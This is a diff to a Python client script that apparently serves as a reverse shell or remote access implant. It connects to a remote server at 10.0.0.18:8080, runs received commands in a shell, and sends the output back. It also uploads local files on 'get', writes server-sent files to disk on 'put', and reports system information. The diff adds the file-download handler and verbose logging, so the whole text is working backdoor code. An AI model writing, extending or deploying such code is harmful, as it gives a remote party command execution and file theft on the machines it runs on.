@@ -1,12 +1,10 @@
 #!/usr/bin/python3
-import socket
-import ssl
-import platform
+import socket, platform, ssl, subprocess
 from printlib import *
 from time import time
-import subprocess 
 from os import remove, path
 from datetime import datetime
+from sys import exit
 
 remote_ip = '10.0.0.18'
 remote_port = 8080
@@ -99,7 +97,7 @@ def delete_keys():
     try:
         remove("client_key")
         remove("client_cert")
-        remove("client_key")
+        remove("server_cert")
     except FileNotFoundError:
         pass
 
@@ -121,7 +119,7 @@ def send_data(conn, plain_text):
     if VERBOSE:
         print_info("Sent:\n"  +plain_text)
 
-def file_transfer(conn, file_name):
+def file_transfer_get(conn, file_name):      #push to server - response from a 'get'
     f = open(file_name, 'rb')
     data = f.read(128)
     if VERBOSE:
@@ -132,6 +130,20 @@ def file_transfer(conn, file_name):
     conn.send("[END]".encode('utf-8'))
     f.close()
 
+def file_transfer_put(conn, file_name):     #download from server - response from a 'put'
+    f = open(file_name,'wb')
+    if VERBOSE:
+        print_info("Receiving --> {}".format(file_name))
+    while True: 
+        data = conn.recv(128)
+        if data.endswith(b"[END]"):
+            f.write(data.rstrip(b"[END]"))
+            print_good("Transfer completed")
+            f.close()
+            break
+        else:
+            f.write(data)
+    f.close()
 
 def connect(remote_ip=remote_ip, remote_port=remote_port):
     data = ""
@@ -159,18 +171,27 @@ def connect(remote_ip=remote_ip, remote_port=remote_port):
                 print_warn("Received kill command")
             conn.close()
             break 
-        elif "get" in data:
+        elif "get" in data:  #find file locally then push to remote server
+            if VERBOSE:
+                print_info("Received GET")
             file_name = data.split()[1]
             if path.exists(file_name):
-                file_transfer(conn, file_name)
+                file_transfer_get(conn, file_name)
             else:
                 send_data(conn, "FILE_NOT_FOUND")
             data = ""
+        elif "put" in data:
+            if VERBOSE:
+                print_info("Received PUT")
+            file_name = data.split()[2]
+            file_transfer_put(conn, file_name)
         elif data == "sysinfo":
             sys_info = sysinfo()
             send_data(conn, sys_info)
         else: # otherwise, we pass the received command to a shell process
             #cmds = data.split()
+            if VERBOSE:
+                print_info("Received cmd --> {}".format(data))
             output = subprocess.getoutput(data)
             send_data(conn, output) # send back the result
             data = "" #reset the data received
